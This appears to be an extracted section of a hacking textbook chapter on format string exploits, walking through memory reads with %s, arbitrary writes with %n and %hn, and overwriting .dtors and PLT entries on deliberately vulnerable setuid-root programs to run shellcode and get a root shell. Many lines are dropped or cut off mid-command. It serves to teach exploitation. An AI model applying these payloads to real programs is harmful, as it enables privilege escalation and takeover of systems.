AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\ngroups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(\nplugdev),104(scanner),112(netdev),113(lpadmin),115(powerdev),117(admin),999(re\nA format string exploit is another technique you can use to gain control of\na privileged program. Like buffer overflow exploits, format string exploits also\ndepend on programming mistakes that may not appear to have an obvious\nimpact on security. Luckily for programmers, once the technique is known,\nit\u2019s fairly easy to spot format string vulnerabilities and eliminate them.\nAlthough format string vulnerabilities aren\u2019t very common anymore, the\nfollowing techniques can also be used in other situations.\nYou should be fairly familiar with basic format strings by now. They have\nbeen used extensively with functions like printf() in previous programs.\nA function that uses format strings, such as printf(), simply evaluates the\nformat string passed to it and performs a special action each time a format\nparameter is encountered. Each format parameter expects an additional\nvariable to be passed, so if there are three format parameters in a format\nstring, there should be three more arguments to the function (in addition\nRecall the various format parameters explained in the previous chapter.\nThe previous chapter demonstrated the use of the more common\nformat parameters, but neglected the less common %n format parameter.\nprintf(\"The number of bytes written up to this point X%n is being stored in\ncount_one, and the number of bytes up to here X%n is being stored in\nprintf(\"A is %d and is at %08x.  B is %x.\\n\", A, &A, B);\nThis program uses two %n format parameters in its printf() statement.\nThe following is the output of the program\u2019s compilation and execution.\nThe number of bytes written up to this point X is being stored in count_one, and the number of\nThe %n format parameter is unique in that it writes data without display-\ning anything, as opposed to reading and then displaying data. When a format\nfunction encounters a %n format parameter, it writes the number of bytes that\nhave been written by the function to the address in the corresponding func-\ntion argument. In fmt_uncommon, this is done in two places, and the unary\naddress operator is used to write this data into the variables count_one and\ncount_two, respectively. The values are then outputted, revealing that 46 bytes\nare found before the first %n and 113 before the second.\nThe stack example at the end is a convenient segue into an explanation\nprintf(\"A is %d and is at %08x.  B is %x.\\n\", A, &A, B);\nWhen this printf() function is called (as with any function), the argu-\nments are pushed to the stack in reverse order. First the value of B, then the\naddress of A, then the value of A, and finally the address of the format string.\nformat parameters? Try removing the last argument from the printf()\nline for the stack example so it matches the line shown below.\nprintf(\"A is %d and is at %08x.  B is %x.\\n\", A, &A);\nThis can be done in an editor or with a little bit of sed magic.\nreader@hacking:~/booksrc $ sed -e 's/, B)/)/' fmt_uncommon.c > fmt_uncommon2.c\nreader@hacking:~/booksrc $ diff fmt_uncommon.c fmt_uncommon2.c\n<    printf(\"A is %d and is at %08x.  B is %x.\\n\", A, &A, B);\n>       printf(\"A is %d and is at %08x.  B is %x.\\n\", A, &A);\nThe number of bytes written up to this point X is being stored in count_one, and the number of\nThe result is b7fd6ff4. What the hell is b7fd6ff4? It turns out that since\nthere wasn\u2019t a value pushed to the stack, the format function just pulled data\nfrom where the third argument should have been (by adding to the current\nframe pointer). This means 0xb7fd6ff4 is the first value found below the\nThis is an interesting detail that should be remembered. It certainly\nwould be a lot more useful if there were a way to control either the number\nof arguments passed to or expected by a format function. Luckily, there is a\nfairly common programming mistake that allows for the latter.\nSometimes programmers use printf(string) instead of printf(\"%s\", string) to\nprint strings. Functionally, this works fine. The format function is passed the\naddress of the string, as opposed to the address of a format string, and it iterates\nthrough the string, printing each character. Examples of both methods are\nprintf(\"The right way to print user-controlled input:\\n\");\nprintf(\"\\nThe wrong way to print user-controlled input:\\n\");\nprintf(\"[*] test_val @ 0x%08x = %d 0x%08x\\n\", &test_val, test_val,\nThe following output shows the compilation and execution of fmt_vuln.c.\nreader@hacking:~/booksrc $ gcc -o fmt_vuln fmt_vuln.c\nreader@hacking:~/booksrc $ sudo chown root:root ./fmt_vuln\nreader@hacking:~/booksrc $ sudo chmod u+s ./fmt_vuln\nBoth methods seem to work with the string testing. But what happens if\nthe string contains a format parameter? The format function should try to\nevaluate the format parameter and access the appropriate function argument\nby adding to the frame pointer. But as we saw earlier, if the appropriate\nfunction argument isn\u2019t there, adding to the frame pointer will reference a\nWhen the %x format parameter was used, the hexadecimal representa-\ntion of a four-byte word in the stack was printed. This process can be used\nreader@hacking:~/booksrc $ ./fmt_vuln $(perl -e 'print \"%08x.\"x40')\n%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.\n%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.\nbffff320.b7fe75fc.00000000.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252\ne78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.2\n52e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e78\n38.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.\nThis is what the lower stack memory looks like. Remember that each\nfour-byte word is backward, due to the little-endian architecture. The bytes\n0x25, 0x30, 0x38, 0x78, and 0x2e seem to be repeating a lot. Wonder what those\nreader@hacking:~/booksrc $ printf \"\\x25\\x30\\x38\\x78\\x2e\\n\"\nAs you can see, they\u2019re the memory for the format string itself. Because\nthe format function will always be on the highest stack frame, as long as the\nformat string has been stored anywhere on the stack, it will be located below\nthe current frame pointer (at a higher memory address). This fact can be\nused to control arguments to the format function. It is particularly useful if\nformat parameters that pass by reference are used, such as %s or %n.\nThe %s format parameter can be used to read from arbitrary memory addresses.\nSince it\u2019s possible to read the data of the original format string, part of the\noriginal format string can be used to supply an address to the %s format\nreader@hacking:~/booksrc $ ./fmt_vuln AAAA%08x.%08x.%08x.%08x\nThe four bytes of 0x41 indicate that the fourth format parameter is\nreading from the beginning of the format string to get its data. If the fourth\nformat parameter is %s instead of %x, the format function will attempt to print\nthe string located at 0x41414141. This will cause the program to crash in a seg-\nmentation fault, since this isn\u2019t a valid address. But if a valid memory address\nis used, this process could be used to read a string found at that memory\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games\nreader@hacking:~/booksrc $ ./getenvaddr PATH ./fmt_vuln\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\xd7\\xfd\\xff\\xbf\")%08x.%08x.%08x.%s\n????bffff3d0.b7fe75fc.00000000./usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/\nHere the getenvaddr program is used to get the address for the environ-\nment variable PATH. Since the program name fmt_vuln is two bytes less than\ngetenvaddr, four is added to the address, and the bytes are reversed due to the\nbyte ordering. The fourth format parameter of %s reads from the beginning\nof the format string, thinking it\u2019s the address that was passed as a function\nargument. Since this address is the address of the PATH environment variable,\nit is printed as if a pointer to the environment variable were passed to printf().\nNow that the distance between the end of the stack frame and the begin-\nning of the format string memory is known, the field-width arguments can be\nomitted in the %x format parameters. These format parameters are only needed\nto step through memory. Using this technique, any memory address can be\nIf the %s format parameter can be used to read an arbitrary memory address,\nyou should be able to use the same technique with %n to write to an arbitrary\nmemory address. Now things are getting interesting.\nThe test_val variable has been printing its address and value in the\ndebug statement of the vulnerable fmt_vuln.c program, just begging to be\noverwritten. The test variable is located at 0x08049794, so by using a similar\ntechnique, you should be able to write to the variable.\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\xd7\\xfd\\xff\\xbf\")%08x.%08x.%08x.%s\n????bffff3d0.b7fe75fc.00000000./usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x94\\x97\\x04\\x08\")%08x.%08x.%08x.%n\nAs this shows, the test_val variable can indeed be overwritten using the\n%n format parameter. The resulting value in the test variable depends on the\nnumber of bytes written before the %n. This can be controlled to a greater\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x94\\x97\\x04\\x08\")%x%x%x%n\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x94\\x97\\x04\\x08\")%x%x%100x%n\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x94\\x97\\x04\\x08\")%x%x%180x%n\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x94\\x97\\x04\\x08\")%x%x%400x%n\nBy manipulating the field-width option of one of the format parameters\nbefore the %n, a certain number of blank spaces can be inserted, resulting in\nthe output having some blank lines. These lines, in turn, can be used to\ncontrol the number of bytes written before the %n format parameter. This\napproach will work for small numbers, but it won\u2019t work for larger ones, like\nLooking at the hexadecimal representation of the test_val value, it\u2019s\napparent that the least significant byte can be controlled fairly well. (Remember\nthat the least significant byte is actually located in the first byte of the four-\nbyte word of memory.) This detail can be used to write an entire address.\nIf four writes are done at sequential memory addresses, the least significant\nbyte can be written to each byte of a four-byte word, as shown here:\nAs an example, let\u2019s try to write the address 0xDDCCBBAA into the test\nvariable. In memory, the first byte of the test variable should be 0xAA, then 0xBB,\nthen 0xCC, and finally 0xDD. Four separate writes to the memory addresses\n0x08049794, 0x08049795, 0x08049796, and 0x08049797 should accomplish this.\nThe first write will write the value 0x000000aa, the second 0x000000bb, the third\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x94\\x97\\x04\\x08\")%x%x%8x%n\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x94\\x97\\x04\\x08\")%x%x%150x%n\nThe last %x format parameter uses 8 as the field width to standardize the\noutput. This is essentially reading a random DWORD from the stack, which\ncould output anywhere from 1 to 8 characters. Since the first overwrite puts\n28 into test_val, using 150 as the field width instead of 8 should control the\nNow for the next write. Another argument is needed for another %x\nformat parameter to increment the byte count to 187, which is 0xBB in\ndecimal. This argument could be anything; it just has to be four bytes long\nand must be located after the first arbitrary memory address of 0x08049754.\nSince this is all still in the memory of the format string, it can be easily\ncontrolled. The word JUNK is four bytes long and will work fine.\nAfter that, the next memory address to be written to, 0x08049755, should\nbe put into memory so the second %n format parameter can access it. This\nmeans the beginning of the format string should consist of the target mem-\nory address, four bytes of junk, and then the target memory address plus one.\nBut all of these bytes of memory are also printed by the format function,\nthus incrementing the byte counter used for the %n format parameter. This is\nPerhaps we should think about the beginning of the format string ahead\nof time. The goal is to have four writes. Each one will need to have a memory\naddress passed to it, and among them all, four bytes of junk are needed to\nproperly increment the byte counter for the %n format parameters. The first\n%x format parameter can use the four bytes found before the format string\nitself, but the remaining three will need to be supplied data. For the entire\nwrite procedure, the beginning of the format string should look like this:\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x94\\x97\\x04\\x08JUNK\\x95\\x97\\x04\\x08JUNK\\x96\\\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0xaa - 52 + 8\"\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x94\\x97\\x04\\x08JUNK\\x95\\x97\\x04\\x08JUNK\\x96\\\nThe addresses and junk data at the beginning of the format string changed\nthe value of the necessary field width option for the %x format parameter.\nHowever, this is easily recalculated using the same method as before. Another\nway this could have been done is to subtract 24 from the previous field width\nvalue of 150, since 6 new 4-byte words have been added to the front of the\nNow that all the memory is set up ahead of time in the beginning of the\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0xbb - 0xaa\"\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x94\\x97\\x04\\x08JUNK\\x95\\x97\\x04\\x08JUNK\\x96\\\nThe next desired value for the least significant byte is 0xBB. A hexa-\ndecimal calculator quickly shows that 17 more bytes need to be written\nbefore the next %n format parameter. Since memory has already been set\nup for a %x format parameter, it\u2019s simple to write 17 bytes using the field\nThis process can be repeated for the third and fourth writes.\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0xcc - 0xbb\"\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0xdd - 0xcc\"\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x94\\x97\\x04\\x08JUNK\\x95\\x97\\x04\\x08JUNK\\x96\\\nx97\\x04\\x08JUNK\\x97\\x97\\x04\\x08\")%x%x%126x%n%17x%n%17x%n%17x%n\n0         4b4e554a         4b4e554a         4b4e554a\nBy controlling the least significant byte and performing four writes, an\nentire address can be written to any memory address. It should be noted that\nthe three bytes found after the target address will also be overwritten using\nthis technique. This can be quickly explored by statically declaring another\ninitialized variable called next_val, right after test_val, and also displaying\nthis value in the debug output. The changes can be made in an editor or with\nHere, next_val is initialized with the value 0x11111111, so the effect of the\nreader@hacking:~/booksrc $ sed -e 's/72;/72, next_val = 0x11111111;/;/@/{h;s/test/next/g;x;G}'\nreader@hacking:~/booksrc $ diff fmt_vuln.c fmt_vuln2.c\n> static int test_val = -72, next_val = 0x11111111;\n> printf(\"[*] next_val @ 0x%08x = %d 0x%08x\\n\", &next_val, next_val, next_val);\nreader@hacking:~/booksrc $ gcc -o fmt_vuln2 fmt_vuln2.c\nAs the preceding output shows, the code change has also moved the\naddress of the test_val variable. However, next_val is shown to be adjacent to it.\nFor practice, let\u2019s write an address into the variable test_val again, using the\nLast time, a very convenient address of 0xddccbbaa was used. Since each\nbyte is greater than the previous byte, it\u2019s easy to increment the byte counter\nfor each byte. But what if an address like 0x0806abcd is used? With this address,\nthe first byte of 0xCD is easy to write using the %n format parameter by output-\nting 205 bytes total bytes with a field width of 161. But then the next byte to\nbe written is 0xAB, which would need to have 171 bytes outputted. It\u2019s easy to\nincrement the byte counter for the %n format parameter, but it\u2019s impossible\nreader@hacking:~/booksrc $ ./fmt_vuln2 AAAA%x%x%x%x\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0xcd - 5\"\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\xf4\\x97\\x04\\x08JUNK\\xf5\\x97\\x04\\x08JUNK\\xf6\\\nreader@hacking:~/booksrc $ ./fmt_vuln2 $(printf \"\\xf4\\x97\\x04\\x08JUNK\\xf5\\x97\\x04\\x08JUNK\\xf6\\\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0xcd - 52 + 8\"\nreader@hacking:~/booksrc $ ./fmt_vuln2 $(printf \"\\xf4\\x97\\x04\\x08JUNK\\xf5\\x97\\x04\\x08JUNK\\xf6\\\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0xab - 0xcd\"\nInstead of trying to subtract 34 from 205, the least significant byte is just\nwrapped around to 0x1AB by adding 222 to 205 to produce 427, which is the\ndecimal representation of 0x1AB. This technique can be used to wrap around\nagain and set the least significant byte to 0x06 for the third write.\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0x1ab - 0xcd\"\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p /d 0x1ab\"\nreader@hacking:~/booksrc $ ./fmt_vuln2 $(printf \"\\xf4\\x97\\x04\\x08JUNK\\xf5\\x97\\x04\\x08JUNK\\xf6\\\nx97\\x04\\x08JUNK\\xf7\\x97\\x04\\x08\")%x%x%161x%n%222x%n\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0x06 - 0xab\"\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0x106 - 0xab\"\nreader@hacking:~/booksrc $ ./fmt_vuln2 $(printf \"\\xf4\\x97\\x04\\x08JUNK\\xf5\\x97\\x04\\x08JUNK\\xf6\\\nx97\\x04\\x08JUNK\\xf7\\x97\\x04\\x08\")%x%x%161x%n%222x%n%91x%n\nWith each write, bytes of the next_val variable, adjacent to test_val, are\nbeing overwritten. The wraparound technique seems to be working fine, but\na slight problem manifests itself as the final byte is attempted.\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0x08 - 0x06\"\nreader@hacking:~/booksrc $ ./fmt_vuln2 $(printf \"\\xf4\\x97\\x04\\x08JUNK\\xf5\\x97\\x04\\x08JUNK\\xf6\\\nx97\\x04\\x08JUNK\\xf7\\x97\\x04\\x08\")%x%x%161x%n%222x%n%91x%n%2x%n\nWhat happened here? The difference between 0x06 and 0x08 is only two,\nbut eight bytes are output, resulting in the byte 0x0e being written by the %n\nformat parameter, instead. This is because the field width option for the\n%x format parameter is only a minimum field width, and eight bytes of data\nwere output. This problem can be alleviated by simply wrapping around\nagain; however, it\u2019s good to know the limitations of the field width option.\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0x108 - 0x06\"\nreader@hacking:~/booksrc $ ./fmt_vuln2 $(printf \"\\xf4\\x97\\x04\\x08JUNK\\xf5\\x97\\x04\\x08JUNK\\xf6\\\nx97\\x04\\x08JUNK\\xf7\\x97\\x04\\x08\")%x%x%161x%n%222x%n%91x%n%258x%n\n??JUNK??JUNK??JUNK??%x%x%161x%n%222x%n%91x%n%258x%n\nJust like before, the appropriate addresses and junk data are put in the\nbeginning of the format string, and the least significant byte is controlled for\nfour write operations to overwrite all four bytes of the variable test_val. Any\nvalue subtractions to the least significant byte can be accomplished by wrap-\nping the byte around. Also, any additions less than eight may need to be\nDirect parameter access is a way to simplify format string exploits. In the\nprevious exploits, each of the format parameter arguments had to be\nstepped through sequentially. This necessitated using several %x format\nparameters to step through parameter arguments until the beginning of the\nformat string was reached. In addition, the sequential nature required three\n4-byte words of junk to properly write a full address to an arbitrary memory\nAs the name would imply, direct parameter access allows parameters to be\naccessed directly by using the dollar sign qualifier. For example, %n$d would\naccess the nth parameter and display it as a decimal number.\nprintf(\"7th: %7$d, 4th: %4$05d\\n\", 10, 20, 30, 40, 50, 60, 70, 80);\nThe preceding printf() call would have the following output:\nFirst, the 70 is outputted as a decimal number when the format param-\neter of %7$d is encountered, because the seventh parameter is 70. The second\nformat parameter accesses the fourth parameter and uses a field width option\nof 05. All of the other parameter arguments are untouched. This method of\ndirect access eliminates the need to step through memory until the beginning\nof the format string is located, since this memory can be accessed directly.\nThe following output shows the use of direct parameter access.\nIn this example, the beginning of the format string is located at the\nfourth parameter argument. Instead of stepping through the first three\nparameter arguments using %x format parameters, this memory can be\naccessed directly. Since this is being done on the command line and the\ndollar sign is a special character, it must be escaped with a backslash. This\njust tells the command shell to avoid trying to interpret the dollar sign as a\nspecial character. The actual format string can be seen when it is printed\nDirect parameter access also simplifies the writing of memory addresses.\nSince memory can be accessed directly, there\u2019s no need for four-byte spacers\nof junk data to increment the byte output count. Each of the %x format param-\neters that usually performs this function can just directly access a piece of\nmemory found before the format string. For practice, let\u2019s use direct param-\neter access to write a more realistic-looking address of 0xbffffd72 into the\nreader@hacking:~/booksrc $ ./fmt_vuln $(perl -e 'print \"\\x94\\x97\\x04\\x08\" . \"\\x95\\x97\\x04\\x08\"\nreader@hacking:~/booksrc $ ./fmt_vuln $(perl -e 'print \"\\x94\\x97\\x04\\x08\" . \"\\x95\\x97\\x04\\x08\"\n. \"\\x96\\x97\\x04\\x08\" . \"\\x97\\x97\\x04\\x08\"')%98x%4\\$n%139x%5\\$n\nreader@hacking:~/booksrc $ ./fmt_vuln $(perl -e 'print \"\\x94\\x97\\x04\\x08\" . \"\\x95\\x97\\x04\\x08\"\n. \"\\x96\\x97\\x04\\x08\" . \"\\x97\\x97\\x04\\x08\"')%98x%4\\$n%139x%5\\$n%258x%6\\$n%192x%7\\$n\nSince the stack doesn\u2019t need to be printed to reach our addresses, the\nnumber of bytes written at the first format parameter is 16. Direct parameter\naccess is only used for the %n parameters, since it really doesn\u2019t matter what\nvalues are used for the %x spacers. This method simplifies the process of\nwriting an address and shrinks the mandatory size of the format string.\nAnother technique that can simplify format string exploits is using short\nwrites. A short is typically a two-byte word, and format parameters have a\nspecial way of dealing with them. A more complete description of possible\nformat parameters can be found in the printf manual page. The portion\ndescribing the length modifier is shown in the output below.\nHere, integer conversion stands for d, i, o, u, x, or X conversion.\nh      A following integer conversion corresponds to a short int or\nunsigned short int argument, or a following n conversion\nThis can be used with format string exploits to write two-byte shorts. In\nthe output below, a short (shown in bold) is written in at both ends of the\nfour-byte test_val variable. Naturally, direct parameter access can still be used.\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x94\\x97\\x04\\x08\")%x%x%x%hn\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x96\\x97\\x04\\x08\")%x%x%x%hn\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x96\\x97\\x04\\x08\")%4\\$hn\nUsing short writes, an entire four-byte value can be overwritten with just\ntwo %hn parameters. In the example below, the test_val variable will be over-\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x94\\x97\\x04\\x08\\x96\\x97\\x04\\x08\")%64874x%4\\\nThe preceding example used a similar wraparound method to deal with\nthe second write of 0xbfff being less than the first write of 0xfd72. Using short\nwrites, the order of the writes doesn\u2019t matter, so the first write can be 0xfd72\nand the second 0xbfff, if the two passed addresses are swapped in position.\nIn the output below, the address 0x08049796 is written to first, and 0x08049794 is\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x96\\x97\\x04\\x08\\x94\\x97\\x04\\x08\")%49143x%4\\\nThe ability to overwrite arbitrary memory addresses implies the ability\nto control the execution flow of the program. One option is to overwrite\nthe return address in the most recent stack frame, as was done with the\nstack-based overflows. While this is a possible option, there are other targets\nthat have more predictable memory addresses. The nature of stack-based\noverflows only allows the overwrite of the return address, but format strings\nprovide the ability to overwrite any memory address, which creates other\nIn binary programs compiled with the GNU C compiler, special table sections\ncalled .dtors and .ctors are made for destructors and constructors, respectively.\nConstructor functions are executed before the main() function is executed,\nand destructor functions are executed just before the main() function exits\nwith an exit system call. The destructor functions and the .dtors table section\nA function can be declared as a destructor function by defining the\nstatic void cleanup(void) __attribute__ ((destructor));\nprintf(\"Some actions happen in the main() function..\\n\");\nprintf(\"and then when main() exits, the destructor is called..\\n\");\nIn the preceding code sample, the cleanup() function is defined with the\ndestructor attribute, so the function is automatically called when the main()\nreader@hacking:~/booksrc $ gcc -o dtors_sample dtors_sample.c\nand then when main() exits, the destructor is called..\nThis behavior of automatically executing a function on exit is controlled by\nthe .dtors table section of the binary. This section is an array of 32-bit addresses\nterminated by a NULL address. The array always begins with 0xffffffff\nand ends with the NULL address of 0x00000000. Between these two are the\naddresses of all the functions that have been declared with the destructor\nThe nm command can be used to find the address of the cleanup()\nfunction, and objdump can be used to examine the sections of the binary.\nThe nm command shows that the cleanup() function is located at 0x080483e8\n(shown in bold above). It also reveals that the .dtors section starts at 0x080495ac\nwith __DTOR_LIST__ (\u0000) and ends at 0x080495b4 with __DTOR_END__ (\u0002). This\nmeans that 0x080495ac should contain 0xffffffff, 0x080495b4 should contain\n0x00000000, and the address between them (0x080495b0) should contain the\nThe objdump command shows the actual contents of the .dtors section\n(shown in bold below), although in a slightly confusing format. The first\nvalue of 80495ac is simply showing the address where the .dtors section is\nlocated. Then the actual bytes are shown, opposed to DWORDs, which means\nthe bytes are reversed. Bearing this in mind, everything appears to be correct.\nreader@hacking:~/booksrc $ objdump -s -j .dtors ./dtors_sample\n80495ac ffffffff e8830408 00000000           ............\nAn interesting detail about the .dtors section is that it is writable. An object\ndump of the headers will verify this by showing that the .dtors section isn\u2019t\nreader@hacking:~/booksrc $ objdump -h ./dtors_sample\nIdx Name          Size      VMA       LMA       File off  Algn\n0 .interp       00000013  08048114  08048114  00000114  2**0\n1 .note.ABI-tag 00000020  08048128  08048128  00000128  2**2\n2 .hash         0000002c  08048148  08048148  00000148  2**2\n3 .dynsym       00000060  08048174  08048174  00000174  2**2\n4 .dynstr       00000051  080481d4  080481d4  000001d4  2**0\n5 .gnu.version  0000000c  08048226  08048226  00000226  2**1\n6 .gnu.version_r 00000020  08048234  08048234  00000234  2**2\n7 .rel.dyn      00000008  08048254  08048254  00000254  2**2\n8 .rel.plt      00000020  0804825c  0804825c  0000025c  2**2\n9 .init         00000017  0804827c  0804827c  0000027c  2**2\n10 .plt          00000050  08048294  08048294  00000294  2**2\n11 .text         000001c0  080482f0  080482f0  000002f0  2**4\n12 .fini         0000001c  080484b0  080484b0  000004b0  2**2\n13 .rodata       000000bf  080484e0  080484e0  000004e0  2**5\n14 .eh_frame     00000004  080485a0  080485a0  000005a0  2**2\n15 .ctors        00000008  080495a4  080495a4  000005a4  2**2\n16 .dtors        0000000c  080495ac  080495ac  000005ac  2**2\n17 .jcr          00000004  080495b8  080495b8  000005b8  2**2\n18 .dynamic      000000c8  080495bc  080495bc  000005bc  2**2\n19 .got          00000004  08049684  08049684  00000684  2**2\n20 .got.plt      0000001c  08049688  08049688  00000688  2**2\n21 .data         0000000c  080496a4  080496a4  000006a4  2**2\n22 .bss          00000004  080496b0  080496b0  000006b0  2**2\n23 .comment      0000012f  00000000  00000000  000006b0  2**0\n24 .debug_aranges 00000058  00000000  00000000  000007e0  2**3\n25 .debug_pubnames 00000025  00000000  00000000  00000838  2**0\n26 .debug_info   000001ad  00000000  00000000  0000085d  2**0\n27 .debug_abbrev 00000066  00000000  00000000  00000a0a  2**0\n28 .debug_line   0000013d  00000000  00000000  00000a70  2**0\n29 .debug_str    000000bb  00000000  00000000  00000bad  2**0\n30 .debug_ranges 00000048  00000000  00000000  00000c68  2**3\nAnother interesting detail about the .dtors section is that it is included in\nall binaries compiled with the GNU C compiler, regardless of whether any\nfunctions were declared with the destructor attribute. This means that the\nvulnerable format string program, fmt_vuln.c, must have a .dtors section\ncontaining nothing. This can be inspected using nm and objdump.\nreader@hacking:~/booksrc $ nm ./fmt_vuln | grep DTOR\nreader@hacking:~/booksrc $ objdump -s -j .dtors ./fmt_vuln\n8049690 ffffffff 00000000                    ........\nAs this output shows, the distance between __DTOR_LIST__ and __DTOR_END__\nis only four bytes this time, which means there are no addresses between them.\nSince the .dtors section is writable, if the address after the 0xffffffff is\noverwritten with a memory address, the program\u2019s execution flow will be\ndirected to that address when the program exits. This will be the address of\n__DTOR_LIST__ plus four, which is 0x08049694 (which also happens to be the\nIf the program is suid root, and this address can be overwritten, it will be\nreader@hacking:~/booksrc $ export SHELLCODE=$(cat shellcode.bin)\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./fmt_vuln\nShellcode can be put into an environment variable, and the address can\nbe predicted as usual. Since the program name lengths of the helper program\ngetenvaddr.c and the vulnerable fmt_vuln.c program differ by two bytes, the\nshellcode will be located at 0xbffff9ec when fmt_vuln.c is executed. This\naddress simply has to be written into the .dtors section at 0x08049694 (shown\nin bold below) using the format string vulnerability. In the output below the\nreader@hacking:~/booksrc $ nm ./fmt_vuln | grep DTOR\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x96\\x96\\x04\\x08\\x94\\x96\\x04\\\nEven though the .dtors section isn\u2019t properly terminated with a NULL\naddress of 0x00000000, the shellcode address is still considered to be a destructor\nfunction. When the program exits, the shellcode will be called, spawning a\nIn addition to the buffer overflow vulnerability, the notesearch program\nfrom Chapter 2 also suffers from a format string vulnerability. This vulner-\nability is shown in bold in the code listing below.\nint print_notes(int fd, int uid, char *searchstring) {\nread(fd, note_buffer, note_length); // Read note data.\nnote_buffer[note_length] = 0;       // Terminate the string.\nif(search_note(note_buffer, searchstring)) // If searchstring found,\nprintf(note_buffer);                    //   print the note.\nThis function reads the note_buffer from the file and prints the contents\nof the note without supplying its own format string. While this buffer can\u2019t be\ndirectly controlled from the command line, the vulnerability can be exploited\nby sending exactly the right data to the file using the notetaker program and\nthen opening that note using the notesearch program. In the following output,\nthe notetaker program is used to create notes to probe memory in the note-\nsearch program. This tells us that the eighth function parameter is at the\nreader@hacking:~/booksrc $ ./notetaker AAAA$(perl -e 'print \"%x.\"x10')\n[DEBUG] buffer   @ 0x804a008: 'AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.'\nAAAAbffff750.23.20435455.37303032.0.0.1.41414141.252e7825.78252e78 .\nNow that the relative layout of memory is known, exploitation is just a\nmatter of overwriting the .dtors section with the address of injected shellcode.\nreader@hacking:~/booksrc $ export SHELLCODE=$(cat shellcode.bin)\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./notesearch\nreader@hacking:~/booksrc $ nm ./notesearch | grep DTOR\nreader@hacking:~/booksrc $ ./notetaker $(printf \"\\x62\\x9c\\x04\\x08\\x60\\x9c\\x04\\\n[DEBUG] buffer   @ 0x804a008: 'b?`?%49143x%8$hn%14825x%9$hn'\nSince a program could use a function in a shared library many times, it\u2019s\nuseful to have a table to reference all the functions. Another special section in\ncompiled programs is used for this purpose\u2014the procedure linkage table (PLT).\nThis section consists of many jump instructions, each one corresponding to\nthe address of a function. It works like a springboard\u2014each time a shared\nfunction needs to be called, control will pass through the PLT.\nAn object dump disassembling the PLT section in the vulnerable format\nstring program (fmt_vuln.c) shows these jump instructions:\nreader@hacking:~/booksrc $ objdump -d -j .plt ./fmt_vuln\n80482b8:       ff 35 6c 97 04 08       pushl  0x804976c\n80482be:       ff 25 70 97 04 08       jmp    *0x8049770\n80482c4:       00 00                   add    %al,(%eax)\n80482c8:       ff 25 74 97 04 08       jmp    *0x8049774\n80482d3:       e9 e0 ff ff ff          jmp    80482b8 <_init+0x18>\n80482d8:       ff 25 78 97 04 08       jmp    *0x8049778\n80482e3:       e9 d0 ff ff ff          jmp    80482b8 <_init+0x18>\n80482e8:       ff 25 7c 97 04 08       jmp    *0x804977c\n80482ee:       68 10 00 00 00          push   $0x10\n80482f3:       e9 c0 ff ff ff          jmp    80482b8 <_init+0x18>\n80482f8:       ff 25 80 97 04 08       jmp    *0x8049780\n80482fe:       68 18 00 00 00          push   $0x18\n8048303:       e9 b0 ff ff ff          jmp    80482b8 <_init+0x18>\n8048308:       ff 25 84 97 04 08       jmp    *0x8049784\n804830e:       68 20 00 00 00          push   $0x20\n8048313:       e9 a0 ff ff ff          jmp    80482b8 <_init+0x18>\nOne of these jump instructions is associated with the exit() function,\nwhich is called at the end of the program. If the jump instruction used for\nthe exit() function can be manipulated to direct the execution flow into\nshellcode instead of the exit() function, a root shell will be spawned. Below,\nthe procedure linking table is shown to be read only.\nreader@hacking:~/booksrc $ objdump -h ./fmt_vuln | grep -A1 